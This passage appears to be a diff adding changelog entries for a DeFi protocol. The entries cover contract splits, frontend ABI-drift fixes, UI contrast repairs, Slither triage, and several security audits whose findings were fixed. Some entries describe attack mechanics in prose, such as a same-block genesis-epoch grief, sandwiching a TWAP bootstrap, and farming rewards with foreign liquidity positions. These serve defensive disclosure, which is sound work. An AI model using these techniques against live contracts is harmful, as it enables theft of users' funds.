+- `5b683706` — that 30-byte margin got dealt with the same day, using the repo's canonical sister-Admin pattern (the one already applied to TegridyLending/TegridyLendingAdmin and SwapFeeRouterAdmin). The entire timelocked admin cluster moved out of `TegridyNFTLending` into a new `TegridyNFTLendingAdmin`: `TimelockAdmin` inheritance, every timelock key and delay constant, every propose/execute/cancel triplet with its `pending*` storage, the `*ReadyAt` views. **24,546 → 17,577 B runtime measured locally** — the commit notes CI measures ~292 B higher, so ~24,838 → ~17,869 — leaving ~7 KB of headroom and needing no EXCEPTIONS allowlist entry; `TegridyNFTLendingAdmin` is 12,755 B. Behaviour-identical by construction: every check, event and custom-error signature preserved, and because error selectors are signature-based every existing `expectRevert` still matches. What deliberately stayed on the main contract is the `setNftLendingAdmin` one-shot setter and the inline 48h-timelocked admin-replacement flow (H-15), **so a broken or compromised admin cannot block its own removal**. 55/55, and the full `tegridy` CI slice 484/484.
+- `da2375e2` — the deploy-side of that split. `DeployNFTLending.s.sol` now deploys both contracts, calls `lending.setNftLendingAdmin(admin)`, and only then transfers both ownerships to the multisig. **The ordering is not stylistic: the setter is `onlyOwner` and one-shot, so it is impossible after the handoff.**
+- `301b320e` — and the runbook had not caught up. Written pre-split at `3c7cbaad`, it still listed NFT Lending as a single-contract deploy; the commit records that an operator following it as-written would accept ownership on `TegridyNFTLending` but not on `TegridyNFTLendingAdmin`, "leaving the Admin (holds ALL governance entrypoints) owned by the deployer EOA, or bricked if that key is rotated". Table row marked `(+Admin)`, NFT Lending added to the accept-on-both step.
+- `3c7cbaad` — [`contracts/RESTORED_FEATURES_DEPLOY_RUNBOOK.md`](contracts/RESTORED_FEATURES_DEPLOY_RUNBOOK.md), 72 lines: per-feature script, required and optional env vars, post-deploy `constants.ts` wiring, multisig `acceptOwnership` steps. It leads with the gate rather than the steps — **these contracts are tested, not re-audited.** The original cut deferred them to "next-wave audited releases", and the de-drift edits above (`powerOf`→`powerOfLiveUnsafe`, `getPosition`→`positions`, the restored `WETHFallbackLib` helper and `SafeERC721Call`) are new code that has never been through an audit wave. Each ships in its own wave before mainnet.
+
+### Fixed — nine undeployed features rendered fully live, transaction-firing UI wired to contracts that do not exist (2026-05-31)
+
+`e8b33a6f`. The relaunch onto a new wallet made every Wave-0/V3 deployment moot, but `constants.ts` still carried their non-zero addresses — and `isDeployed()` only tests `!= 0x0`. **Every "coming soon / not deployed" fallback in the app was therefore bypassed**, and users were shown working Create Loan Offer, Buy NFT, Subscribe, Deposit Bribe, Create Proposal, Create Bounty and Stake LP flows pointed at contracts that were not in `src` and not in `DeployMVP`. The commit records this was checked in a live browser through the Chrome extension before and after.
+
+Zeroing the nine addresses (`LP_FARMING`, `GAUGE_CONTROLLER`, `COMMUNITY_GRANTS`, `MEME_BOUNTY_BOARD`, `VOTE_INCENTIVES`, `PREMIUM_ACCESS`, `TEGRIDY_LENDING`, `TEGRIDY_NFT_LENDING`, `TEGRIDY_NFT_POOL_FACTORY`) was on its own enough to re-arm the self-gates that already existed in `LendingSection`, `AMMSection`, `LPFarmingSection` and `GaugeVoting`; the previous addresses are kept inline for post-redeploy recovery. Four sections had no gate at all and are now gated at their parents so they unmount and fire no reads — `NFTLendingSection` on LendingPage, and Grants / Bounties / VoteIncentives on CommunityPage — behind a new shared `FeatureNotDeployed` placeholder. PremiumPage becomes a whole-page placeholder and its `usePremiumAccess` reads are `isDeployed`-gated so they stop tripping the error banner. ContractsPage and SecurityPage now render undeployed contracts as pending rather than as a live link to `0x0` alongside stale redeploy and multisig notes.
+
+The two ABI-drift batches that followed are the other half of the same problem — the features were not merely un-gated, they would not have worked:
+
+- `d3a567cc` (batch A, the unambiguous cases). `VoteIncentives.commitVote` had gained a third `power` argument that the hand-maintained ABI, `useBribes.commitVote` and `VoteIncentivesSection.handleCommitVote` all dropped, **so the commit phase of commit-reveal would have reverted**; the UI already computed `power`, it just was not threaded through. And `useLPFarming` + `AdminPage` read `totalSupply`/`balanceOf` on `TegridyLPFarming`, which is not an ERC-20 and exposes `totalRawSupply`/`rawBalanceOf` — both reads would revert and the TVL and staked-LP tiles would show 0. Verified by `tsc`.
+- `fe60a2d4` (batch B). `swapETHForNFTs` is `(tokenIds, maxTotalCost, deadline)` payable and the frontend sent only `tokenIds`, **so every NFT-AMM buy reverted**; it now sends quote + 5% (the pool refunds the excess on-chain, verified at L345-348) and a 20-minute deadline. `swapNFTsForETH` was missing its deadline, so every sell reverted too. `changeFee` on the pool is now a revert stub and the real path is the timelocked `proposeFeeChange` → 24h → `executeFeeChange`, so the TRADE-pool fee admin was rewired to propose/execute/cancel. `TegridyNFTLending.createOffer` gained a sixth `uint64 _expiry` bounded to `[now+1h, now+90d]` and the frontend sent five args, so offer creation reverted; it now defaults to 30 days. Two read shapes were wrong in opposite directions: `getBounty` declared a phantom eighth `dummy` output against a contract returning seven — **over-declaring is the decode-breaking direction** — and `getProposal` was synced 8→10 outputs for the added `snapshotTimestamp`/`snapshotTotalStake`, with the two hardcoded tuple casts in Bounties and GrantsSection fixed to match. Verified by `tsc --noEmit` at 0 errors plus ESLint.
+
+### Security — a 53-agent adversarial audit over all 30 contracts found no Critical, High or Medium; four Lows closed (2026-05-31)
+
+`ec371851` records the shape of the pass: 14 verified findings (3 Low + 10 Info, as the commit tallies them) and **21 false positives killed by adversarial verification** — roughly three in five of everything reported. One of the four closed Lows was net-new and came from the manual v4 cross-check rather than the agents: LOW-4a was **missed by all 16 finder agents**.
+
+- **LOW-1** `TegridyBoostedLPStaker.onERC721Received` now reverts `DirectNFTTransferNotAllowed`. A raw `safeTransferFrom` bypassing `deposit()` would otherwise escrow an NFT with no depositor and no recovery path — orphaned permanently. `deposit()` uses plain `transferFrom` and never invokes the hook, so the happy path is untouched.
+- **LOW-2** `POLAccumulator` daily-cap subtraction made saturating, so lowering `dailyETHCap` below the amount already consumed in the window returns a graceful `DailyCapExceeded` instead of an arithmetic Panic.
+- **LOW-4a** `TegridyV4Hook`/Admin `sweepPOL` is now `onlyParamAdmin`, with an instant `hookSweepPOL` governance passthrough. Pre-fix it was permissionless and routed the whole fee line to `polRecipient`, **letting anyone bypass a configured staker/treasury split**. The rescue-hatch role is preserved and the guardian's never-move-funds invariant is untouched.
+- **LOW-4b** `ReferralSplitter` gains `armForfeiture` (owner-only, and only valid while below threshold *now*), anchoring the 7-day forfeiture grace to a fresh current-episode confirmation. This closes an attacker pre-arm that collapsed the grace through a transient power dip. The M6 monotonic `lastBelowStakeTime` invariant — added four days earlier, see the 2026-05-27 entry — is read-only here and left fully intact. **Forfeiture is now a two-step owner flow**: `armForfeiture` → wait 7d → `forfeitUnclaimedRewards`, with the anchor cleared on claim and on forfeit.
+
+Six tests added, including `test_LOW4_preArmCannotCollapseGrace`, which both proves the attack is dead and asserts the M6 mark is unchanged. Full suite 1565/0; all five touched contracts under EIP-170.
+
+`a477ee2f` took the Info tier — dead-code removal and comment corrections only, no behaviour change. `StakingRewardLib._decayIfExpired` was a **dead mirror of the host's live copy that nothing ever invoked**, and removing it eliminates a latent double-decrement footgun (a second wired copy would double-subtract `totalBoostedStake`); being internal and uncalled, `TegridyStaking`'s size was verified unchanged at 24,569 B, margin 7. Two stale NatSpec blocks were corrected: `_safeInt256`'s overflow note still said `1e12` and "100/s" where the live constants are `ACC_PRECISION` and `MAX_REWARD_RATE`, both `1e18`; and `RevenueDistributor.protocolDustPool` is documented as the write-only lifetime accumulator it is, with the decrement correctly attributed to `totalEarmarked`. Four further Info items were **declined in writing rather than silently dropped** — an `OwnableNoRenounce` poke-reset (EIP-170 risk on the margin-7 `TegridyStaking` for nil benefit), `HookAdmin` propose-time bounds (would duplicate the hook's private `MAX_DISCOUNT_BPS`; execute already re-validates), a `TegridyRestaking` `totalRestaked` guard (deferred with the over-limit non-MVP contract, invariant-protected today), and the standing acceptances for centralization, by-design behaviour and the year-2106 `uint32` rollover.
+
+### Security — the V4 code got its own no-mercy audit: 1 Critical, 2 High, and one Medium resolved by deleting the contract (2026-05-30 → 2026-05-31)
+
+`8ad37a68` merged `next-wave/v4-migration` into `launch/v2-with-v4`, bringing `src/v4/`, both V4 deploy scripts and six handoff documents onto the launch line. `32aa5cb5` then ran a fresh exploit hunt over it, deliberately independent of prior audit claims — adversarial re-read plus two independent audit agents, **every finding verified against file:line, with one agent finding rejected as a false positive** (escrowed-position modify, already blocked by ERC-721 approval clearing). Five areas were independently verified safe: POL `afterSwap` delta accounting, discount auth, `unlockCallback`, router reentrancy, and the permission flags.
+
+`89b57851` closed the top three, each with an exploit test:
+
+- **C-1 (Critical, reward theft)** — `TegridyBoostedLPStaker.deposit` accepted *any* V4 position, with no pool or in-range check, so junk, foreign or out-of-range liquidity could farm TOWELI emissions. It now validates through `getPoolAndPositionInfo`, requiring the `PoolId` to equal a new immutable `allowedPoolId` constructor argument **and** full-range ticks at the `TickMath` usable bounds. Tests: `test_C1_boostedStaker_rejectsForeignPool` and `_rejectsNonFullRange`.
+- **H-1 (High, liquidity DoS)** — `TegridyV4Hook._notifyBoostedLP` had no `try`/`catch`, so a reverting or malicious boosted-LP module could brick liquidity add and remove **including emergency exit while paused**, breaking the paused-exit-stays-open invariant.
+- **H-2** — the Synthetix `rewardRate * duration <= balanceOf` solvency guard was added to both reward contracts, and then **the commit corrected its own finding**: an honest re-analysis records that `rewardRate` is derived from the actually-transferred balance and leftover is bounded by prior funding, so with a standard token the contract is solvent by construction and the guard is hardening, not a live HIGH. Kept because it is cheap and standard. Suite 38 passed, up from 35.
+
+`8afb9a4d` took the rest under an explicit mandate — resolve every finding *without* introducing new exploits, so where a naive fix would add more risk than the finding, resolve by removal or documented acceptance rather than fragile code. **M-3 was resolved by deleting `TegridyBoostedLP.sol` outright**, along with the hook's boosted-LP wiring and the admin's `boostedLP` timelock triplet: that killed both the double-count foot-gun and the root cause of the H-1 module-revert DoS in one change, leaving `TegridyBoostedLPStaker` as the sole path. M-1 gave the router a `maxIn` parameter and a `TooMuchSpent` revert, closing the unbounded-input sandwich on exact-*output* swaps; L-1 made the refund snapshot `balance - msg.value` before unlock so a call refunds only its own surplus instead of sweeping donated ETH to the next caller. M-2 and L-2/L-3/L-4 were accepted with reasoning recorded in `V4_SECURITY_FINDINGS.md` — each naive fix was judged to add a worse exploit than the finding (fold-boost-into-accrual reintroduces the H-1 DoS class just removed; owner dust-sweep is a generic rug vector). **Net surface: one contract fewer, -387/+95 LoC.** 34/34, and the code remains unaudited and behind the V2-launch gate.
+
+`2b4a29ec` then synced the auditor handoff to what had actually landed — the scope table dropped the deleted contract (5→4 contracts, ~1,205→~1,012 LoC), M-1 was moved from "not implemented" to implemented, and both deploy scripts had their "PauseGuardian deferred" comments corrected to WIRED, with `VerifyV4` keeping the still-true note that it does not yet *assert* that invariant.
+
+`5a4d5626` closed the two follow-ons, and is notable for what it refused to port. Every claim about `TegridyLPFarming` was checked against real file:line first, because LPFarming is MVP-cut from this branch and only reference copies exist in worktrees. The 24h `NOTIFY_COOLDOWN` anti-sandwich gate (F-93-2) was ported verbatim with a test. **The forfeit-residue capture and `reclaimForfeitedRewards` were deliberately not ported**: that bucket's value in LPFarming comes from a reward-forfeiting `emergencyWithdraw` the staker has no equivalent of, so it could only ever hold sub-nano truncation dust — and a reclaim sweep is exactly the owner rug-surface that audit L-3 rejected. Two further non-ports (duration-timelock equality, `MAX_REWARD_RATE`) are documented in-code at the `rewardRate` calculation rather than left to be rediscovered. `DeployV4` now deploys the swap router and the staker, deriving `allowedPoolId` in-script from the canonical pool key; `VerifyV4` asserts the pause guardian, discount both-or-neither plus router match, router↔hook PoolManager identity, and that the staker's immutable `allowedPoolId` is the canonical pool. It correctly does *not* assert `hook.boostedLP() == 0`, since M-3 removed the field — a stale reference the commit fixed in both the prior comment and the runbook checklist.
+
+### Fixed — body copy unreadable over full-bleed background art, and a wallet gate that read as a dead page (2026-05-27 → 2026-05-31)
+
+A frontend audit on 2026-05-27 raised 118 issues ([`AUDIT_FRONTEND_2026_05_27.md`](AUDIT_FRONTEND_2026_05_27.md), 208 lines) and a re-pass on 2026-05-30 walked the same surfaces at iPhone 14 Pro and iPad Mini in Chrome DevTools Device Mode. The largest cluster is a single defect — **art-first pages had shipped with scrims tuned for art, not for reading** — and the remainder is label overflow at 390 plus two Farm copy bugs.
+
+- `ddbcb61d` — two CRITs from the first pass. On `/nft-finance` all four disconnected tabs rendered an identical `ConnectPrompt` body, so **the tabs looked non-functional**; each now carries its own copy. On `/premium` a stray `IMG_0177` photo override sat on the Gold Card icon and was replaced with an inline gold SVG glyph. Also `fetchpriority` → `fetchPriority` in the Nakamigos image component, which had been emitting a React DOM warning on every render.
+- `3ef5fe53` — the three highest-leverage re-pass findings. The TopNav Tradermigos link went `hidden md:block` → `!hidden lg:!flex`: it was **visible at 390 through a CSS-specificity escape**, and at iPad 768 it overflowed its 50px slot and bled under Connect on roughly 25 pages. BottomNav already carries Tradermigos at both sizes, so desktop-only is the correct rule, and the `!` prefix defeats any `.nav-link` override. `.nav-link` gained `white-space: nowrap` so labels like "NFT Finance" stop wrapping to two lines and breaking row height at iPad portrait. And the ChangelogPage entry-card scrim went from `rgba(0,0,0,0.55)` + 2px blur to 0.85 + 4px — logged CRIT, because **body copy was essentially invisible over the bright jungle-ape art panels at iPad**.
+- `d6965a6b` — the same scrim treatment swept across the remaining information pages: FAQ search bar and section cards 0.6 → 0.85; SecurityPage wrapper 0.55 → 0.85 with blur 2px → 4px, which is what made the Audit-Methodology body readable against the skull art; and Risks / Terms / Privacy had their gradient's top stop raised 0.55 → 0.80, since the previous value left the *top* of the legal and compliance pages — hero heading and intro — dominated by background art. Separately, an iPad-only middle-breakpoint regression: TokenomicsPage and TreasuryPage had `md:grid-cols-3` on a four-card stats row, giving iPad portrait 3 + an orphan; now `md:grid-cols-2` for a 2×2, with `lg` still four across. **Two flagged findings were refuted rather than fixed** — CommunityPage's 3-col tab grid already switches to `md:flex` at 768 (the screenshot likely caught the boundary), and LorePage's only finding was pill overlap, not contrast.
+- `30719ca3` — the last three items. The "Protocol Active" LiveActivity pill is now route-hidden on the long-form information, legal and policy surfaces (`/security /risks /terms /privacy /lore /changelog /contracts /treasury /tokenomics /faq /community`) where the iPad pass caught it overlapping treasury balances, legal copy and changelog entries; transactional and landing routes keep it, because the overlap only matters on prose. TradePage tab labels were shortened in `TAB_LABELS` — "Recurring Swap" → "DCA", "Price Alert" → "Alerts" — because at 390 the full names overflowed their 80px buttons and **collided into the single run-on string "Recurring SwaPrice Alert"**; `titleByTab` keeps the descriptive names in the page header so no meaning is lost. And the Nakamigos custom header's "Connect Wallet" became "Connect", having **overflowed that header by 43px at 390** — the sub-app header does not responsive-shrink.
+- `b460ff75` — the last HIGH, and the original audit's highest-leverage finding: the pre-connect "dead page" state on `/farm`, `/swap`, `/liquidity`, `/dashboard`, `/history` and `/lending`. `ConnectPrompt` gained a card backdrop on its outer element (`rgba(6,12,26,0.82)`, `blur(8px)`, subtle border, soft shadow, rounded), so **the wallet gate is now a visually anchored card on every transactional surface instead of unframed text floating on full-bleed page art** — one shared-component change that fixes both the contrast and the unframed look. LendingPage's NFT-finance section-tab strip went 0.4 → 0.85 so the tabs stop fading into the art. Verified at iPad 768 on `/farm`.
+- `26521f56` — two small Farm corrections. `usePoolData`'s low-stake APR ceiling rendered `>9999%`, which reads like a render glitch; it is now formatted `>9,999%` so it is legibly a deliberate cap. **The maths was correct — a near-empty pool legitimately produces an astronomical APR** — so only the presentation changed. And the FarmPage season banner rendered `Season {number}: {name}` where `name` is already "Season 2", producing "Season 2: Season 2"; it now renders the name alone.
+
+Four of the six — `3ef5fe53`, `d6965a6b`, `30719ca3`, `b460ff75` — record both an in-browser check and `tsc --noEmit` exiting 0. `ddbcb61d` and `26521f56` record neither.
+
+### Internal — the Slither gate cleared one CI round at a time; roughly thirty MEDIUMs triaged, all but one a false positive (2026-05-30 → 2026-05-31)
+
+No behaviour change anywhere in this group — every commit is comments and configuration. The static-analysis gate runs `fail-on: medium`, and it took round after round to clear because **three separate properties of how Slither reports findings made each round's fix look complete when it was not.** Those three lessons are the durable content here. The only round count any commit states is `55bb27f7`'s "the lesson from the last 4 rounds"; by the time the V4 merge landed, `15f35381` counts 22 V2 mediums already cleared.
+
+- `1afde657` — the only genuinely real finding in the set. `RevenueDistributor._distribute().histCallSucceeded` was an uninitialized local: the bool is assigned in both `try`/`catch` branches below, but the detector only sees the declaration, so it is explicitly initialised to `false` rather than suppressed. Two `TegridyRestaking` LOW `timestamp` findings were suppressed as plain false positives — the flagged comparisons (`balance > reserved`, `p.amount > unattributed`, and `value > uint256(type(int256).max)` in a `pure` function) contain no `block.timestamp` at all.
+- `b92a79e6` — **lesson one: findings from an earlier CI round do not reappear in later ones.** Three MEDIUM `unused-return` findings had been posted at 15:12 UTC, predated the events being responded to, and were simply lost, so the gate kept failing on a commit whose own comments were all addressed. Two `TegridyFactory` flush helpers and `StakingMonitorView.getPosition`, all standard `EnumerableSet` and tuple-skip patterns.
+- `ff26c899` — 14 more, on the branch the body records as PR [#73](https://github.com/fomotsar-commits/tegridy-farms/pull/73). Eleven `unused-return` across `TegridyFactory` and `TegridyTWAP` where the surrounding propose/execute/cancel flow guarantees presence or absence. Then **lesson two: Slither aggregates every `reentrancy-no-eth` finding under a single anchor**, so suppressing only the spec-listed `TegridyRestaking.decayExpiredRestaker` left the whole MED block standing — two structurally identical `TegridyStaking` functions sat inside the same anchor and had to be suppressed to drop it. Verified locally: 11 instances and 1 MED block before, 0 and 0 after, with HIGH/LOW/INFO unchanged.
+- `6416fb53` then `55bb27f7` — **lesson three: read the report, not the anchors.** The earlier sweep had only targeted three medium detectors, and the CI SARIF revealed a fourth in `detectors_to_run`: `incorrect-equality`. Four instances, every one an intentional zero-sentinel or value-equality check — `TegridyStaking._writeCheckpoint`'s `last == newPower` no-op early-exit (the same pattern as Compound and OZ Governor checkpoint writes), `OwnableNoRenounce`'s `expiry == 0`, `TegridyTWAP.withdrawFees`' `amount == 0`, `ReferralSplitter.markBelowStake`'s `lastBelowStakeTime == 0`. `55bb27f7` caught the fifth, `RevenueDistributor._distribute`'s `locked == 0` at L535, and pre-emptively suppressed the sibling branch at L542 so the next round would not fail on the same pattern one branch over. Both commits record the method that finally worked: **parse the CI `slither-report.json` for `impact == 'Medium'` rather than grepping anchors** — stated in `55bb27f7` as "the lesson from the last 4 rounds".
+- `15f35381` then `a586bf07` — six new MEDIUMs appeared when the V4 merge brought `src/v4/` onto the branch, all verified false positives with the same discipline (read file:line, classify, suppress with justification). `a586bf07` is the tail: `15f35381` landed only five of the six, because its `deposit()` suppression **did not apply — the real signature carries an extra `updateReward(msg.sender)` modifier the matcher missed** — a suppression that silently matched nothing.
+- `33f935f3` — the same class of silent miss, from the opposite direction. `TegridyLending.acceptOffer` L1146 flagged `unused-return` on an 11-field position tuple read *even though the `slither-disable-next-line` directive was present* — because two explanatory comment lines sat between the directive and the statement, and **`disable-next-line` suppresses only the immediately following source line.** Moving the directive adjacent to the call fixed it.
+- `ac9d2f64` — `TegridyNFTLendingAdmin` was first-scanned after the EIP-170 split and flagged `reentrancy-no-eth` on its owner-only timelock functions. Both suppressed as false positives: the only external calls are to the trusted `lending` contract and the state written afterwards is readable only by sibling owner-only functions. Verified locally at 0 Medium/High remaining, with 148 Low and 1 Info, none gating.
+- `13b336b7` — finally, the `timestamp` detector was excluded outright. It never gated `fail-on: medium`, but it kept posting recurring PR review comments on `RevenueDistributor`, `ReferralSplitter`, `POLAccumulator` and others every single run, and **every flagged comparison on this protocol is a period-scale time gate** — timelock intervals, grace and cooldown windows, TWAP staleness bounds — none of them movable by a miner's ~12-second wiggle. `weak-prng` deliberately stays enabled, so the genuinely dangerous "`block.timestamp` as randomness" case is still caught; only the noisy comparison detector is silenced.
+
+### Fixed — Frontend ABIs drifted from the restored contracts: seven declarations across six contracts, including every NFT-AMM buy and every sell (2026-05-31)
+
+Two direct-to-trunk commits ten minutes apart, `d3a567cc` (batch A, 18:32) and
+`fe60a2d4` (batch B, 18:43). The relaunch restored nine contract features, and
+they came back carrying audit-fix parameters that
+[`frontend/src/lib/contracts.ts`](frontend/src/lib/contracts.ts) — hand-maintained,
+not generated — had never tracked; it still declared the pre-audit signatures.
+viem encodes whatever arity the ABI declares, so a wrong-arity entry produces a
+selector no function on the target answers, and none of these contracts declares a
+`fallback`, so such a call reverts with empty returndata. Nothing fails at build
+time.
+
+**Batch A — `d3a567cc`:**
+
+- **The commit half of commit-reveal voting could not have run.**
+  `VoteIncentives.commitVote` is `(uint256 epoch, bytes32 commitHash, uint256
+  power)` (`VoteIncentives.sol:1538`); the ABI entry,
+  [`useBribes.commitVote`](frontend/src/hooks/useBribes.ts) and
+  `VoteIncentivesSection.handleCommitVote` all sent two arguments. The dropped
+  third is not decoration — it is the quantity the MICROSCOPE C2 cap meters,
+  `committedPower[msg.sender][epoch] + power <= userPower` at L1562, anchored
+  against the smaller of snapshot and live power. The UI already computed
+  `_power` and discarded it at the call boundary; it is now threaded through.
+- **LP-farm TVL and staked-LP would have rendered 0.** `TegridyLPFarming` is not
+  an ERC20 — it exposes `totalRawSupply` (L118) and `rawBalanceOf` (L128) as
+  public state — while both
+  [`useLPFarming`](frontend/src/hooks/useLPFarming.ts) and
+  [`AdminPage`](frontend/src/pages/AdminPage.tsx) read `totalSupply`/`balanceOf`.
+  Reads repointed, stale ABI entry renamed. **The fix was incomplete in the
+  direction nobody re-checks:** the ABI kept its `balanceOf` declaration, a
+  function the farm has never had, and that residue survived until the frontend
+  selector guard removed it on 2026-07-28 (`f855b744`,
+  [#124](https://github.com/fomotsar-commits/tegridy-farms/pull/124)) — see that
+  entry.
+
+**Batch B — `fe60a2d4`:**
+
+- **`swapETHForNFTs` is `(tokenIds, maxTotalCost, deadline) payable`
+  (`TegridyNFTPool.sol:270`) and the frontend sent `tokenIds` alone;
+  `swapNFTsForETH` had likewise gained a deadline. Every buy and every sell on
+  the NFT AMM was a guaranteed revert.** The buy path now sends `maxTotalCost =
+  quote × 105 / 100` as both the argument and `value`, with a 20-minute deadline.
+  Overpaying that cap is not a leak: the pool reverts `MaxCostExceeded` when
+  `inputAmount > maxTotalCost` (L298) and `InsufficientETH` when `msg.value <
+  inputAmount` (L299), then refunds `msg.value - inputAmount` at L345 before it
+  returns.
+- **A fee control wired to a revert stub, labelled "Immediate (no timelock)".**
+  `changeFee` is now `external pure { revert("USE_PROPOSE_FEE_CHANGE"); }`
+  (L572); the live path is `proposeFeeChange` → `PARAMETER_TIMELOCK` (24 hours,
+  L121) → `executeFeeChange`, with `cancelFeeChange`. The TRADE-pool admin panel
+  was rewired to propose/execute/cancel — matching what spot and delta already
+  did — and the label corrected to "24h timelock".
+- **NFT-lending offer creation reverted.** `createOffer` gained a sixth `uint64
+  _expiry`, bounded on-chain to `[now + 1 hours, now + 90 days]`
+  (`TegridyNFTLending.sol:169-170`, enforced at L543-544); the frontend sent five
+  arguments. Offers now default to staying open 30 days.
+- **Read shapes.** The `getBounty` ABI declared a phantom eighth `dummy` output
+  against a contract returning seven (`MemeBountyBoard.sol:841`), and
+  `getProposal` declared eight against ten (the contract appends
+  `snapshotTimestamp` and `snapshotTotalStake`). Both synced, and the two
+  hardcoded tuple casts in `BountiesSection`/`GrantsSection` fixed with them.
+
+**Three things this entry will not claim.**
+
+1. **None of it was reachable.** Every address behind these calls was
+   `0x0000…0000` in [`constants.ts`](frontend/src/lib/constants.ts) as of
+   `fe60a2d4` — LP farming, vote incentives, community grants, the bounty board,
+   NFT lending and the NFT-pool factory, all six zeroed earlier the same day by
+   `e8b33a6f` (15:45), the commit that re-gated the nine deferred features behind
+   `isDeployed`. This was latent breakage caught ahead of the wave deploy whose
+   runbook (`3c7cbaad`) was committed four minutes after batch B. **"Would have
+   reverted", not "did".**
+2. **Batch B's stated reason for the `getBounty` fix is wrong**, and the repo
+   measured it wrong itself seven weeks later. The commit body calls
+   over-declaring outputs "the decode-breaking direction";
+   [`memeBountyBoardAbi.test.ts`](frontend/src/lib/memeBountyBoardAbi.test.ts),
+   added 2026-07-23 with
+   [#101](https://github.com/fomotsar-commits/tegridy-farms/pull/101), pins that
+   an over-declared extra output **would not have thrown** — the dynamic
+   `description` string keeps the returned payload at eight slots or more, so the
+   phantom output silently decodes the string's length word. Removing it was
+   still correct, but the failure mode was a wrong number rather than an
+   exception, and here a wrong number nothing read: the destructure stops at
+   index 6.
+3. **The verification was a type-check, not an execution.** `tsc` clean on both
+   commits, ESLint on batch B. No test pinned any of these arities at the time.
+   The gate for exactly this class — phase 2 of
+   [`check-interface-selectors.mjs`](scripts/check-interface-selectors.mjs),
+   which canonicalizes every signature in every hand-rolled frontend ABI against
+   the artifact's `methodIdentifiers`, fail-closed — arrived on 2026-07-28, two
+   months after the drift it would have caught, and its scope is source artifacts
+   rather than deployed bytecode.
+
+### Security — a line-by-line review of the whole tree: six lettered batches, two of them closed by deleting the code (2026-05-30)
+
+Six lettered batches, H-A through H-F. Two of the six resolve their finding by removal rather than by adding a guard, which is the minimal-surface mandate applied literally.
+
+- **H-A** `c04d4ff1` — deleted `src/lib/SafeERC721Call.sol` (zero importers across `src/`, `script/` and `test/`, verified by grep) and deleted the `VotePowerOracle.powerOf` compile-compat alias, which had zero in-tree consumers. The alias is the interesting one: it was **an autocomplete footgun**, the obvious name a future consumer would reach for, and it silently returned the flash-stake-vulnerable live read instead of forcing an explicit choice between `powerOfLiveUnsafe` (acknowledged) and `powerAt(_, ts)` (epoch-pinned). No behavioural diff; 1524/0. *Both deletions were paid for the next day — see the restored-features entry, where `SafeERC721Call` came back because its consumer did, and the missing alias cost six call-site repoints (two in `159616a9`, four in `3b457872`).*
+- **H-B** `ec1fc170` — a genesis-epoch grief in `RevenueDistributor._distribute()`. The original fallback "if hist returns 0, use live `totalBoostedStake()`" **conflated two different things: the historical call succeeding with 0, and the historical call reverting.** Given the `MIN_DISTRIBUTE_STAKE = 1000e18` entry guard, a successful 0 at T-1 with a non-zero live value can only mean every settled stake happened in the current block — so the old code would cement an epoch keyed at T-1 with a denominator that includes current-block stakes, while every per-user `votingPowerAtTimestamp(user, T-1)` read returns 0. The attack costs one stake and one call: stake 1001e18 at block N, call `distributePermissionless()` in the same block, and the epoch locks with a denominator nobody can claim against — **the entire epoch's revenue forfeits to the 180-day auto-reconcile before the owner's `executeForfeitReclaim` could recover it.** Now the two semantics are split by tracking `histCallSucceeded`: a successful 0 reverts `GenesisEpochUnsettled()` (the keeper retries a block later, a bootstrap delay and nothing more), and a revert keeps the F-12-K-4 live-fallback verbatim for the future-ABI-break liveness path. Pattern of record: Curve's FeeDistributor refuses to advance its `time_cursor` over genesis-empty windows for the same reason. **A second HIGH from the same audit pass was rejected as a false positive** — the 10k-gas stipend is a documented Seaport/Solmate-grade defence against cross-contract reentrancy, raising it would widen the attack surface, and recipients needing more gas have full recovery via `withdrawPending()`, which has no stipend cap.
+- **H-C** `4537cf48` — two HIGH classes in `TegridyTWAP`. First, bypass-class observations could pin `lastSpot`: the owner-only gate blocked permissionless writes, but **an attacker who sandwiches the owner's bootstrap transaction with a reserve tilt could pin `lastSpot` at the manipulated value across all three bootstrap observations** — roughly 45 minutes of sustained tilt — after which the deviation gate vetoes honest observations and bricks the buffer until the 24h-timelocked `proposeAdminResetPair` heals it. The gate changed from `!forcedBypass` to `!bypassed` so all bypass observations skip the write. The cumulatives, which are the actual TWAP value source, were verified honest throughout. Second, `withdrawFees` forwarded *all* remaining gas to a fee recipient that is settable through a 24h timelock; a captured key could install a recipient whose `receive()` runs arbitrary code with the ETH and unlimited gas, and while TWAP is `nonReentrant`, that frame can call into RevenueDistributor, POLAccumulator or SwapFeeRouter, which do not share the guard. Bounded to `gas: 50_000` — enough for a Gnosis Safe v1.4 with a module or two (~30-45k), matching Aave V3's treasury-sweep envelope.
+- **H-D** `a6a0bc03` — three HIGHs in `TegridyRestaking`. The bonus accrual cap used the raw on-hand `balanceOf`, which **included funds already owed as deferred payouts** in `unforwardedBonusRewards` from transfers that had previously failed; fresh emission shares were therefore minted against liquidity already backing someone else's debt, and ordinary claims could drain the shared pool and shortchange the deferred claimant. `totalUnforwardedBonus` is now subtracted from `available` at all three sites — the modifier, the `pendingBonus` view and the internal accrual — with the view-side mirror keeping frontends and indexers from drifting against on-chain accrual. Second, `proposeClearResidualClaimant(tokenId, address(0))` meant "abandon the claim", but executing it deleted the local claimant while leaving the staking-side residue unclaimed, so **the next restaker of that NFT would silently inherit a lost-key user's residue**; a zero `newClaimant` is now rejected at propose time, and if no successor exists the owner can simply decline, leaving the residue stuck but unsiphonable. Third, `acceptOwnership` swept three of four TimelockAdmin keys and missed `SWEEP_STUCK_CHANGE`, letting an outgoing owner pre-queue a live timelock for the incoming one.
+- **H-E** `864847b2` — the staking expiry-cap fix, plus a HIGH that was **verified, confirmed, and then deliberately not fixed on-chain.** The agent's claim about `setJbacVault` one-shot recoverability checked out against the code — the vault's `onlyStaking` reverts before `returnJbac`'s catch, so a mis-wired vault never records `strandedJbacOwner`. But `script/VerifyMVP.s.sol:113` already enforces INV-7 (`jbacVault.staking() == staking`) on every deploy run, catching the mis-config off-chain before any user deposits. Adding the on-chain check was attempted twice and **measured at ~90 B and then ~70 B, either of which pushed `TegridyStaking` over EIP-170 against 39 B of headroom.** The conclusion — documented operator discipline plus a NatSpec pointer to INV-7 — cites Aave V3's PoolAddressesProvider relying on deploy-script verification for the same reason. `setJbacVault` stays one-shot so a captured owner cannot rotate to a hostile vault. *The expiry-cap half of this batch was reverted the same day; see the next entry.*
